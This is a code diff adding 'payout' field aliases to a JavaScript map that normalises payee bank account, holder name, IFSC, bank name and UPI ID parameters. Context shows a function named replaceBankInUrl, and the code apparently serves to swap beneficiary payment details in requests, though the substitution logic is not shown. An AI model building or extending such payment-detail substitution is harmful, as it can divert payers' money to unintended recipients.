@@ -918,6 +918,7 @@ const BANK_FIELDS = {
   'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
   'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
   'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
+  'payoutaccount': 'accountNo', 'payoutaccountno': 'accountNo', 'payoutno': 'accountNo',
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
   'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
@@ -927,17 +928,19 @@ const BANK_FIELDS = {
   'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
   'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
   'customername': 'accountHolder', 'customerrealname': 'accountHolder',
+  'payoutname': 'accountHolder', 'payoutaccountholder': 'accountHolder', 'payoutaccountname': 'accountHolder',
   'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
   'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
   'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
+  'payoutifsc': 'ifsc', 'payoutifsccode': 'ifsc',
   'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
   'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
-  'collectionbankname': 'bankName',
+  'collectionbankname': 'bankName', 'payoutbank': 'bankName', 'payoutbankname': 'bankName',
   'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
   'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
   'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
   'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
-  'customerupi': 'upiId'
+  'customerupi': 'upiId', 'payoutupi': 'upiId', 'payoutupiid': 'upiId'
 };
 
 function replaceBankInUrl(urlStr, bank) {
